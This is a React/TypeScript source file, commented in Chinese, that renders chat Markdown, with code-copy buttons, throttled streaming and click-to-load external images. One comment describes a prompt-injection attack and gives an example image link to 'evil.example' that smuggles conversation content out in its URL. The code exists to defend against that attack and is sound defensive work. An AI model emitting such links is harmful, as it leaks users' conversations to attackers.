"use client";

/**
 * Markdown 正文渲染（消息、流式回答、用户气泡共用）。
 *
 * 单独成模块是为了让它成为**懒加载分块**：react-markdown + remark-gfm + rehype-highlight
 * 带着 lowlight/highlight.js 的常用语言集，实测占首屏 JS 的 472KB（全部首屏 JS 1272KB），
 * 而 Hero 页（还没开会话）根本用不到它。ChatWindow 用 next/dynamic 引用本模块，
 * 首屏不再下载这 472KB；AppShell 在空闲时预取，真正打开会话时通常已经就绪。
 */
import { memo, useEffect, useRef, useState } from "react";
import ReactMarkdown from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { IconCheckOutline14, IconCopyOutline16 } from "@/components/icons";
import { copyText } from "@/lib/clipboard";
import { useI18n } from "@/i18n";

type MarkdownTextNode = { value?: unknown; children?: MarkdownTextNode[] };

function markdownNodeText(node: MarkdownTextNode | undefined): string {
	if (!node) return "";
	if (typeof node.value === "string") return node.value;
	return node.children?.map(markdownNodeText).join("") ?? "";
}

function CopyButton({ text }: { text: string }) {
	const [copied, setCopied] = useState(false);
	const [copyFailed, setCopyFailed] = useState(false);
	const { t } = useI18n();
	return (
		<>
			<button
				type="button"
				className="icon-btn"
				title={copyFailed ? t.copyFailed : t.copy}
				aria-label={t.copy}
				onClick={() => {
					void copyText(text).then((ok) => {
						setCopied(ok);
						setCopyFailed(!ok);
						setTimeout(() => { setCopied(false); setCopyFailed(false); }, 1200);
					});
				}}
			>
				{copied ? <IconCheckOutline14 size={14} /> : <IconCopyOutline16 size={14} />}
			</button>
			{copyFailed && <span role="alert" style={{ fontSize: 11, color: "var(--dsw-danger)" }}>{t.copyFailed}</span>}
		</>
	);
}

/** 同源图片可以直接显示；外部地址不行（见 SafeImage）。data: 早被 react-markdown 的默认 URL 过滤掉了 */
function isInlineImage(src: string): boolean {
	if (typeof window === "undefined") return false;
	try {
		return new URL(src, window.location.href).origin === window.location.origin;
	} catch {
		return false;
	}
}

/**
 * 外部图片默认不加载，点了才加载。
 * 模型输出可能被提示词注入（读到的网页、文件里藏着指令），让它写一张
 * `![](https://evil.example/?d=<会话内容>)`，浏览器一渲染就把内容发出去了 —— 不需要用户点任何东西。
 */
function SafeImage({ src, alt, title }: { src?: unknown; alt?: string; title?: string }) {
	const [allowed, setAllowed] = useState(false);
	const { t } = useI18n();
	const source = typeof src === "string" ? src : "";
	if (!source) return null;
	if (allowed || isInlineImage(source)) return <img src={source} alt={alt ?? ""} title={title} />;
	let host = source;
	try {
		host = new URL(source).host || source;
	} catch {
		/* 保留原样 */
	}
	return (
		<button type="button" className="btn-outline" style={{ height: 26, padding: "0 10px", fontSize: 12 }} title={source} onClick={() => setAllowed(true)}>
			{t.externalImage}{alt ? `：${alt}` : ""}（{host}）
		</button>
	);
}

export const MarkdownBlock = memo(function MarkdownBlock({ text }: { text: string }) {
	return (
		<div className="md">
			<ReactMarkdown
				remarkPlugins={[remarkGfm]}
				rehypePlugins={[[rehypeHighlight, { detect: false, ignoreMissing: true }]]}
				components={{
					a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
					img: ({ src, alt, title }) => <SafeImage src={src} alt={alt} title={title} />,
					pre: ({ node, children, ...props }) => (
						<div className="md-code-block">
							<div className="md-code-copy"><CopyButton text={markdownNodeText(node)} /></div>
							<pre {...props}>{children}</pre>
						</div>
					),
				}}
			>
				{text}
			</ReactMarkdown>
		</div>
	);
});

/** 流式正文的节流渲染（见 ChatWindow 的说明）：这里只负责延迟把稳定文本交给 MarkdownBlock */
const STREAM_MARKDOWN_THROTTLE_MS = 100;

export const StreamingMarkdownBlock = memo(function StreamingMarkdownBlock({ text }: { text: string }) {
	const [shown, setShown] = useState(text);
	const latest = useRef(text);
	const timer = useRef<ReturnType<typeof setTimeout> | null>(null);
	useEffect(() => {
		latest.current = text;
		// 节流而不是防抖：计时器只在空闲时才设，期间到来的新文本只更新 latest、不重置计时。
		// 若每次变化都清掉重来，文本一直在流（约 16ms 一次）时计时器永远到不了点，正文就冻住了。
		if (text === shown || timer.current) return;
		timer.current = setTimeout(() => {
			timer.current = null;
			setShown(latest.current);
		}, STREAM_MARKDOWN_THROTTLE_MS);
	}, [text, shown]);
	useEffect(() => () => {
		if (timer.current) clearTimeout(timer.current);
		timer.current = null;
	}, []);
	return <MarkdownBlock text={shown} />;
});

export default MarkdownBlock;
